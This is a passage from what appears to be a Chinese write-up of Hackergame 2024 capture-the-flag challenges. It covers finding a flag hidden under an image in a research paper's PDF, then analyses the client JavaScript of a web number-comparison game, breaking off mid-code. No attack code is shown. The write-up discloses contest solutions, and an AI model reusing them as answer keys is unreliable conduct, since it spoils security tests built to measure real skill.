+<p>好吧，我再也不要用<span class="heti-skip"><span class="heti-spacing"> </span>Firefox<span class="heti-spacing"> </span></span>打开<span class="heti-skip"><span class="heti-spacing"> </span>PDF<span class="heti-spacing"> </span></span>了，莫名其妙卡了我好久。</p>
+<p><a href="https://dl.acm.org/doi/pdf/10.1145/3650212.3652145?download=true">下载论文<span><span class="heti-spacing"> </span>PDF</span></a>，搜索「flag」可以看到隐藏的 <code>flag_here</code> 字样：</p>
+<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%AF%8F%E6%97%A5%E8%AE%BA%E6%96%87%E5%A4%AA%E5%A4%9A%E4%BA%86%EF%BC%81/images/flag_here.png"><img alt="flag_here" src="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%AF%8F%E6%97%A5%E8%AE%BA%E6%96%87%E5%A4%AA%E5%A4%9A%E4%BA%86%EF%BC%81/images/flag_here.png"/></a></p>
+<p>用<span class="heti-skip"><span class="heti-spacing"> </span>PDF<span class="heti-spacing"> </span></span>阅读器打开，移开上方的白色图片就能看到<span><span class="heti-spacing"> </span>Flag</span>：</p>
+<p><a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="auto" href="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%AF%8F%E6%97%A5%E8%AE%BA%E6%96%87%E5%A4%AA%E5%A4%9A%E4%BA%86%EF%BC%81/images/flag.png"><img alt="flag" src="https://raw.githubusercontent.com/13m0n4de/hackergame2024-writeups/refs/heads/main/general/%E6%AF%8F%E6%97%A5%E8%AE%BA%E6%96%87%E5%A4%AA%E5%A4%9A%E4%BA%86%EF%BC%81/images/flag.png"/></a></p>
+<p><span>Flag<span class="heti-spacing"> </span></span>有点糊糊的。</p>
+<p>当时用<a href="https://linux.die.net/man/1/pdfimages"><span class="heti-skip"><span class="heti-spacing"> </span>pdfimages<span class="heti-spacing"> </span></span></a>提取了<span class="heti-skip"><span class="heti-spacing"> </span>PDF<span class="heti-spacing"> </span></span>中全部的图片，但只是随便翻看了一下，觉得「总不会在这么严肃的论文里藏什么东西吧」就关掉了。</p>
+<h2 id="web_1"><span>[Web]<span class="heti-spacing"> </span></span>比大小王<a class="headerlink" href="#web_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
+<h3 id="_2">网页源码分析<a class="headerlink" href="#_2" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
+<p>游戏状态保存在 <code>state</code> 变量中：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">state</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">allowInput</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">    </span><span class="nx">score1</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="c1">// 玩家分数</span>
+<span class="w">    </span><span class="nx">score2</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="c1">// 对手分数</span>
+<span class="w">    </span><span class="nx">values</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="c1">// 服务器返回题目数字</span>
+<span class="w">    </span><span class="nx">startTime</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="c1">// 开始时间</span>
+<span class="w">    </span><span class="nx">value1</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="c1">// 正在进行比较的数字 1</span>
+<span class="w">    </span><span class="nx">value2</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="c1">// 正在进行比较的数字 2</span>
+<span class="w">    </span><span class="nx">inputs</span><span class="o">:</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="c1">// 玩家输入的答案，由 "&lt;" 和 "&gt;" 字符串组成的数组</span>
+<span class="w">    </span><span class="nx">stopUpdate</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>页面加载时会调用 <code>loadGame</code> 函数向 <code>/game</code> 发送<span class="heti-skip"><span class="heti-spacing"> </span>POST<span class="heti-spacing"> </span></span>请求获取题目：</p>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'load'</span><span class="p">,</span><span class="w"> </span><span class="nx">loadGame</span><span class="p">());</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">loadGame</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/game'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/json'</span><span class="p">,</span>
+<span class="w">            </span><span class="p">},</span>
+<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({}),</span>
+<span class="w">        </span><span class="p">})</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">values</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">values</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">startTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">startTime</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">value1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">values</span><span class="p">[</span><span class="mf">0</span><span class="p">][</span><span class="mf">0</span><span class="p">];</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">value2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">values</span><span class="p">[</span><span class="mf">0</span><span class="p">][</span><span class="mf">1</span><span class="p">];</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'value1'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">value1</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'value2'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">value2</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">updateCountdown</span><span class="p">();</span>
+<span class="w">        </span><span class="p">})</span>
+<span class="w">        </span><span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'加载失败，请刷新页面重试'</span><span class="p">;</span>
+<span class="w">        </span><span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>服务端返回的 <code>values</code> 中包含了开始时间和比大小的一对对数字。</p>
+<p>设置好 <code>state</code> 后，调用 <code>updateCountdown</code> 函数，根据开始时间播放倒计时动画：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">updateCountdown</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">stopUpdate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">seconds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">ceil</span><span class="p">((</span><span class="nx">state</span><span class="p">.</span><span class="nx">startTime</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">())</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">seconds</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">updateCountdown</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">seconds</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">seconds</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">seconds</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">updateCountdown</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">seconds</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'none'</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">state</span><span class="p">.</span><span class="nx">allowInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">updateTimer</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>当游戏开始时，调用 <code>updateTimer</code> 函数更新时间和对手进度，对手会在<span class="heti-skip"><span class="heti-spacing"> </span>10<span class="heti-spacing"> </span></span>秒完成题目：</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">updateTimer</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">stopUpdate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">time1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">startTime</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">time2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">min</span><span class="p">(</span><span class="mf">10000</span><span class="p">,</span><span class="w"> </span><span class="nx">time1</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">state</span><span class="p">.</span><span class="nx">score2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">time2</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">100</span><span class="p">));</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'time1'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">time1</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">60000</span><span class="p">)).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">'0'</span><span class="p">)</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">time1</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">60</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">'0'</span><span class="p">)</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nx">time1</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">1000</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="s1">'0'</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'time2'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">time2</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">60000</span><span class="p">)).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">'0'</span><span class="p">)</span><span class="si">}</span><span class="sb">:</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">time2</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">1000</span><span class="p">)</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">60</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">'0'</span><span class="p">)</span><span class="si">}</span><span class="sb">.</span><span class="si">${</span><span class="nb">String</span><span class="p">(</span><span class="nx">time2</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mf">1000</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">3</span><span class="p">,</span><span class="w"> </span><span class="s1">'0'</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'score2'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">score2</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'progress2'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">state</span><span class="p">.</span><span class="nx">score2</span><span class="si">}</span><span class="sb">%`</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">score2</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">state</span><span class="p">.</span><span class="nx">allowInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">state</span><span class="p">.</span><span class="nx">stopUpdate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'对手已完成，挑战失败！'</span><span class="p">;</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'dialog'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'flex'</span><span class="p">;</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'time1'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`00:10.000`</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">requestAnimationFrame</span><span class="p">(</span><span class="nx">updateTimer</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>玩家按键或点击选择答案，会调用 <code>chooseAnswer</code> 函数将答案放入 <code>state.inputs</code> 中。当玩家获得<span class="heti-skip"><span class="heti-spacing"> </span>100<span class="heti-spacing"> </span></span>分时调用 <code>submit</code> 函数提交答案，否则显示错误信息：</p>
+<div class="highlight"><pre><span></span><code><span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'keydown'</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'ArrowLeft'</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'a'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'less-than'</span><span class="p">).</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">'active'</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'less-than'</span><span class="p">).</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">'active'</span><span class="p">),</span><span class="w"> </span><span class="mf">200</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">chooseAnswer</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'ArrowRight'</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'d'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'greater-than'</span><span class="p">).</span><span class="nx">classList</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="s1">'active'</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'greater-than'</span><span class="p">).</span><span class="nx">classList</span><span class="p">.</span><span class="nx">remove</span><span class="p">(</span><span class="s1">'active'</span><span class="p">),</span><span class="w"> </span><span class="mf">200</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">chooseAnswer</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">});</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'less-than'</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">chooseAnswer</span><span class="p">(</span><span class="s1">'&lt;'</span><span class="p">));</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'greater-than'</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">'click'</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">chooseAnswer</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">));</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">chooseAnswer</span><span class="p">(</span><span class="nx">choice</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">state</span><span class="p">.</span><span class="nx">allowInput</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">state</span><span class="p">.</span><span class="nx">inputs</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">choice</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">correct</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">value1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">value2</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">choice</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'&lt;'</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">value1</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">value2</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">choice</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s1">'&gt;'</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">correct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">state</span><span class="p">.</span><span class="nx">score1</span><span class="o">++</span><span class="p">;</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'answer'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'#5e5'</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">correct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'answer'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'#e55'</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'answer'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">choice</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'score1'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">score1</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'progress1'</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">state</span><span class="p">.</span><span class="nx">score1</span><span class="si">}</span><span class="sb">%`</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">state</span><span class="p">.</span><span class="nx">allowInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">score1</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">submit</span><span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">inputs</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">correct</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">value1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">values</span><span class="p">[</span><span class="nx">state</span><span class="p">.</span><span class="nx">score1</span><span class="p">][</span><span class="mf">0</span><span class="p">];</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">value2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">values</span><span class="p">[</span><span class="nx">state</span><span class="p">.</span><span class="nx">score1</span><span class="p">][</span><span class="mf">1</span><span class="p">];</span>
+<span class="w">            </span><span class="nx">state</span><span class="p">.</span><span class="nx">allowInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'value1'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">value1</span><span class="p">;</span>
+<span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'value2'</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">state</span><span class="p">.</span><span class="nx">value2</span><span class="p">;</span>
